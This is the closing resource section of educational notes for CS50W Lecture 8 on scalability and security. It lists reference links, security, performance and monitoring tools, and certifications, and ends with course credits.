- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web security risks
- [AWS Well-Architected Framework](https://aws.amazon.com/architecture/well-architected/)
- [Google SRE Book](https://sre.google/books/) - Site Reliability Engineering

### Tools
- **Security:** OWASP ZAP, Burp Suite, Snyk
- **Performance:** Apache JMeter, Gatling, k6
- **Monitoring:** Prometheus, Grafana, New Relic, Datadog

### Further Learning
- CS50's Cybersecurity course
- Web application security certifications (OSWE, CEH)
- Cloud provider certifications (AWS, GCP, Azure)

---

**Course:** CS50W - Web Programming with Python and JavaScript  
**Lecture:** 8 - Scalability and Security  
**Instructors:** Brian Yu & David J. Malan  
**Institution:** Harvard University

*This documentation was created for educational purposes based on CS50W course materials.*